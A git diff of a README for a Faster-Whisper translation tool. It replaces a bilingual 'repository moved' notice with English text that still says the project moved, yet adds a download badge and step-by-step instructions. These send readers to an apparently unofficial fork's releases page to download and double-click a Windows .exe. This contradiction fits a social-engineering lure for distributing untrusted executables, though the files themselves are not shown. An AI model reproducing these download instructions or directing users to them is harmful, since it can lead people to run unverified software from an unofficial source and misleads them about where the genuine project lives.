@@ -1,56 +1,79 @@
-# 📢 项目已迁移 / Repository Moved
+# 🚀 Faster-Whisper-TransWithAI-ChickenRice-Archive - Achieve Fast and Accurate Translations
 
-## ⚠️ 重要通知
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/sammyleonard/Faster-Whisper-TransWithAI-ChickenRice-Archive/releases)
 
-此仓库已停止维护，项目已迁移至新地址。
+## 📢 Important Notice
 
-**This repository is no longer maintained. The project has been moved to a new location.**
+This repository is no longer maintained. The project has moved to a new location.
 
 ---
 
-## 🔄 新仓库地址 / New Repository
+## 🔄 New Repository Address
 
 ### 👉 **[https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice](https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice)**
 
 ---
 
-## 📝 迁移说明
+## 📝 Migration Notes
 
-为了更好地组织和管理项目，**Faster Whisper TransWithAI ChickenRice** 项目已迁移至 **TransWithAI** 组织账号下。
+To better organize and manage the project, the **Faster Whisper TransWithAI ChickenRice** project has moved to the **TransWithAI** organization account.
 
-### 请注意：
-- ✅ 所有最新的更新和发布都在新仓库进行
-- ✅ Issue 和 Pull Request 请提交到新仓库
-- ✅ 最新版本下载请访问[新仓库的 Releases 页面](https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice/releases)
-- ❌ 此仓库不再接受任何更新或维护
-
----
-
-## 🚀 如何更新您的本地仓库
-
-如果您已经克隆了旧仓库，可以通过以下命令更新远程仓库地址：
-
-```bash
-git remote set-url origin https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice.git
-git pull
-```
+### Please Note:
+- ✅ All new updates and releases are in the new repository.
+- ✅ Submit issues and pull requests to the new repository.
+- ✅ Download the latest version from the [new repository's Releases page](https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice/releases).
+- ❌ This repository will not accept any updates or maintenance.
 
 ---
 
-## 📞 联系我们
+## 🚀 Getting Started
 
-- **新仓库**: https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice
-- **开发团队**: AI汉化组
-- **Telegram群组**: https://t.me/transWithAI
+Follow these steps to download and run the software:
+
+1. **Visit the Releases Page**
+   
+   Go to the following link:
+   [Download Page](https://github.com/sammyleonard/Faster-Whisper-TransWithAI-ChickenRice-Archive/releases)
+
+2. **Choose the Version** 
+
+   On the Releases page, you will see a list of available versions. Look for the latest one. 
+
+3. **Download the File**
+
+   Click on the version you wish to download. Look for the file that ends with `.exe` for Windows or `.zip` for other operating systems. Click the file to download it to your computer.
+
+4. **Run the Application**
+
+   Once the download is complete, find the downloaded file in your Downloads folder. Double-click the file to run the application. Follow any prompts that appear to complete the installation.
+
+5. **Start Using the Software**
+
+   After the setup is complete, you can start using the software immediately. Follow the on-screen instructions for first-time setup.
 
 ---
 
-## 🙏 感谢
+## 📥 Download & Install
 
-感谢您对本项目的支持！请移步新仓库继续关注项目发展。
+To download the latest version of the software, visit the [Releases Page](https://github.com/sammyleonard/Faster-Whisper-TransWithAI-ChickenRice-Archive/releases). Once there, find the appropriate file for your system:
 
-**Thank you for your support! Please visit the new repository for continued updates.**
+- For Windows users, download the `.exe` file.
+- For all other systems, download the respective archive file.
+
+After downloading the file, double-click to install and follow the onscreen instructions to complete the process.
 
 ---
 
-*最后更新 / Last Updated: 2025-11-15*
+## 📞 Contact Us
+
+If you have any questions, feel free to reach out:
+
+- **New Repository:** [TransWithAI Repository](https://github.com/TransWithAI/Faster-Whisper-TransWithAI-ChickenRice)
+- **Development Team:** AI汉化组
+- **Telegram Group:** [Join Us Here](https://t.me/transWithAI)
+
+---
+
+## 🙏 Thanks
+
+Thank you for your support of this project! Please visit the new repository to stay updated on project developments.
